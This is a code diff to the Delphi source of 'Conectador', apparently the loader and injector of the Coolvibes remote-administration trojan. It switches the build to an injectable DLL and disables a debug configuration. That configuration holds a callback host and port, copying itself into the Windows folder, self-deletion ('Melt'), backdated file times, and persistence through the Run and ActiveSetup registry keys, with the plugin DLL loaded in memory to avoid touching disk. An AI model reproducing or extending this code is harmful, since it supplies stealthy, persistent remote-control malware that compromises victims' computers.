@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-//library Conectador; //Para inyectar descomentar
-program Conectador; //Para no inyectar descomentar
+library Conectador; //Para inyectar descomentar
+//program Conectador; //Para no inyectar descomentar
 uses
   Windows,
   BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
@@ -23,8 +23,6 @@ uses
   vars,
   Shfolder,
   Minireg;
-
-
 var
   dllc             : string;
   i                : integer;
@@ -322,19 +320,19 @@ begin
       else
       begin
         //Para Debug
-        //Exitprocess(0);
-        Configuracion.sHosts                  := '127.0.0.1:80¬';
-        Configuracion.sID                     := 'Coolserver';
+        Exitprocess(0);
+        {Configuracion.sHosts                  := 'localhost:80¬';
+        Configuracion.sID                     := 'v';
         Configuracion.bCopiarArchivo          := false;
-        Configuracion.sFileNameToCopy         := 'coolserver.exe';
-        Configuracion.sCopyTo                 := '%windir%\lol\';
+        Configuracion.sFileNameToCopy         := 'w.exe';
+        Configuracion.sCopyTo                 := '%AppDir%\';
         Configuracion.bCopiarConFechaAnterior := False;
         Configuracion.bMelt                   := False;
-        Configuracion.bArranqueRun            := true;
-        Configuracion.sRunRegKeyName          := 'Coolserver';
-        Configuracion.bArranqueActiveSetup    := true;
-        Configuracion.sActiveSetupKeyName     := 'test';
-        Configuracion.sPluginName             := 'coolserver.dll';
+        Configuracion.bArranqueRun            := false;
+        Configuracion.sRunRegKeyName          := 'w';
+        Configuracion.bArranqueActiveSetup    := false;
+        Configuracion.sActiveSetupKeyName     := '{t';
+        Configuracion.sPluginName             := 's.dll';      }
 				//Configuracion.sInyectadorFile         := '';
         dllc := GetCurrentDirectory+Configuracion.sPluginName;
         //Fin de Para debug
